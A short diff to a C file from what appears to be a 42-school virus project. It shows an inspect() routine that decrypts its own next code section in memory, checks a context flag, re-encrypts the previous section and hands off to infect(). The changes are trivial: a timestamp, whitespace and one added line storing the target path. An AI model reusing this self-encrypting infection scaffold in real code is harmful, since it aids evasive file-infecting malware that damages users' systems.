@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/31 19:28:21 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/08 15:46:44 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/08 18:18:46 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -26,8 +26,6 @@ void	inspect(t_data *data, char *path)
 #endif
 
 	revert_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
-
-
 	if (data->context != true)
 		goto next;
 
@@ -56,6 +54,7 @@ void	inspect(t_data *data, char *path)
 		goto next;
 	}
 	data->context = true;
+	data->name = path;
 
 #ifdef DEBUG
 	_write(1, path, _strlen(path));
@@ -64,7 +63,7 @@ void	inspect(t_data *data, char *path)
 
 
 next:
-	update_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
+   	update_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
 	revert_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
 	infect(data);
 }
